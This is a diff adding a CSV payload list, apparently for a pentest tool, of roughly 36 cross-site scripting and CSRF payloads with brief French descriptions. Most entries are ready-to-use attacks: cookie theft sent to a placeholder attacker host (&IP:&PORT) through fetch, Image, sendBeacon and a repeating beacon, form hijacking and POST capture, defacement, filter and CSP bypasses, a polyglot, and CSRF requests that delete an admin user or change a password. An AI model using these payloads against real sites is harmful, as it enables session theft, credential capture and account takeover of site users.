@@ -1,0 +1,37 @@
+payload,description
+<script>alert(1)</script>,XSS réflectée basique
+<script>alert(document.cookie)</script>,XSS — vol cookie
+<img src=x onerror=alert(1)>,XSS via img onerror
+<img src=x onerror=alert(document.cookie)>,XSS — vol cookie via img
+<svg onload=alert(1)>,XSS via svg onload
+<body onload=alert(1)>,XSS via body onload
+<input onfocus=alert(1) autofocus>,XSS via input autofocus
+<details open ontoggle=alert(1)>,XSS via details ontoggle
+<iframe src=javascript:alert(1)>,XSS via iframe javascript:
+javascript:alert(1),XSS URL javascript: scheme
+<script>document.location='http://&IP:&PORT/?c='+document.cookie</script>,XSS — exfil cookie vers &IP:&PORT
+"<img src=x onerror=""document.location='http://&IP:&PORT/?c='+document.cookie"">",XSS — exfil cookie via img
+<script>new Image().src='http://&IP:&PORT/?c='+encodeURIComponent(document.cookie)</script>,XSS — exfil cookie Image()
+<script>fetch('http://&IP:&PORT/?c='+btoa(document.cookie))</script>,XSS — exfil cookie fetch() base64
+"<script>navigator.sendBeacon('http://&IP:&PORT/',document.cookie)</script>",XSS — exfil cookie sendBeacon
+<script>document.body.innerHTML='<h1>Hacked</h1>'</script>,XSS — défacement page
+<script>document.forms[0].action='http://&IP:&PORT/'</script>,XSS — hijack action formulaire
+"<script>document.querySelector('form').addEventListener('submit',e=>{fetch('http://&IP:&PORT/?d='+new URLSearchParams(new FormData(e.target)));});</script>",XSS — capture POST formulaire
+<ScRiPt>alert(1)</sCrIpT>,XSS bypass casse mixte
+<script>eval(atob('YWxlcnQoMSk='))</script>,XSS bypass base64
+<script>\u0061lert(1)</script>,XSS bypass unicode escape
+<svg><script>alert&#40;1&#41;</script>,XSS bypass entités HTML
+"<img src=1 href=1 onerror=""javascript:alert(1)"">",XSS bypass href
+"""><script>alert(1)</script>",XSS injection attribut HTML
+'><script>alert(1)</script>,XSS injection attribut guillemet simple
+</textarea><script>alert(1)</script>,XSS break textarea
+</script><script>alert(1)</script>,XSS break script tag
+"<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>",XSS charcode obfusqué
+<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js'></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>,XSS bypass CSP via AngularJS CDN
+<base href='https://&IP:&PORT/'>,XSS base href hijacking
+"<script>setInterval(()=>{fetch('http://&IP:&PORT/?k='+document.cookie)},5000)</script>",XSS stockée — beacon répété toutes 5s
+<script>document.write('<img src=http://&IP:&PORT/?c='+document.cookie+'>')</script>,XSS stockée — document.write exfil
+"<script>fetch('/admin/delete_user',{method:'POST',body:'id=1',credentials:'include'})</script>",XSS+CSRF — suppression user admin
+<img src='http://victim/api/change_password?newpass=hacked'>,CSRF GET — changement mot de passe
+"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>>",XSS polyglot max coverage
+"\"";alert(1)//",XSS break JS string inline
